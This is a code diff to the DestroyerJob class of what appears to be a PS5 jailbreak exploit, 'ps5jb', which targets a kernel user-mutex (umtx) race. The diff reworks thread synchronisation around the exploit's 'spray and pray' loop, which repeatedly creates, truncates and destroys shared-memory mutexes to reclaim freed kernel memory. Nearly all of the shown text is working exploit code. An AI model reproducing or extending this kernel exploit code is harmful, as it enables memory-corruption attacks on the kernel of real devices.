@@ -1,6 +1,7 @@
 package org.ps5jb.client.payloads.umtx.impl1;
 
 import org.ps5jb.client.payloads.umtx.common.DebugStatus;
+import org.ps5jb.sdk.core.Pointer;
 import org.ps5jb.sdk.core.SdkException;
 import org.ps5jb.sdk.include.UniStd;
 import org.ps5jb.sdk.include.machine.Param;
@@ -67,14 +68,24 @@ public class DestroyerJob extends CommonJob {
                 DebugStatus.error("Performing destroy operation failed", e);
             }
 
-            if (Config.toggleSprayOnDestroyThread) {
+            // Notify that destroyer thread done its main job.
+            this.state.numCompletedThreads.incrementAndGet();
+
+            DebugStatus.debug("Waiting for spray flag");
+            while (!this.state.sprayFlag.get()) {
+                thread_yield();
+            }
+
+            if (this.state.numDestructions.get() >= Config.MAX_DESTROYER_THREADS && Config.toggleSprayOnDestroyThread) {
                 DebugStatus.notice("Spraying and praying");
-                for (int i = this.index; i < this.state.reclaimDescriptors.length; i = i + Config.MAX_DESTROYER_THREADS) {
+                for (int i = this.index; i < this.state.reclaimDescriptors.length; i += Config.MAX_DESTROYER_THREADS) {
                     try {
+                        Pointer secShm = this.state.secondarySharedMemoryKeyAddress.inc(0x8L * i);
+
                         if (DebugStatus.isDebugEnabled()) {
                             DebugStatus.debug("Creating secondary user mutex #" + i);
                         }
-                        int descriptor = umtx.userMutexCreate(this.state.secondarySharedMemoryKeyAddress.inc(0x8 * i));
+                        int descriptor = umtx.userMutexCreate(secShm);
 
                         if (DebugStatus.isDebugEnabled()) {
                             DebugStatus.debug("Descriptor of secondary shared memory object #" + i + ": " + descriptor);
@@ -87,7 +98,7 @@ public class DestroyerJob extends CommonJob {
                         uniStd.ftruncate(descriptor, Param.ptoa(descriptor));
 
                         DebugStatus.debug("Destroying secondary user mutex #" + i);
-                        umtx.userMutexDestroy(this.state.secondarySharedMemoryKeyAddress.inc(0x8 * i));
+                        umtx.userMutexDestroy(secShm);
                     } catch (SdkException e) {
                         DebugStatus.error("Spray failed at iteration " + i, e);
                     }
@@ -95,8 +106,8 @@ public class DestroyerJob extends CommonJob {
                 DebugStatus.notice("Spraying done");
             }
 
-            // Notify that destroyer thread done its main job.
-            this.state.numCompletedThreads.incrementAndGet();
+            // Notify that destroyer thread done spraying.
+            this.state.numSprays.incrementAndGet();
 
             DebugStatus.debug("Waiting for check done flag");
             while (!this.state.checkDoneFlag.get()) {
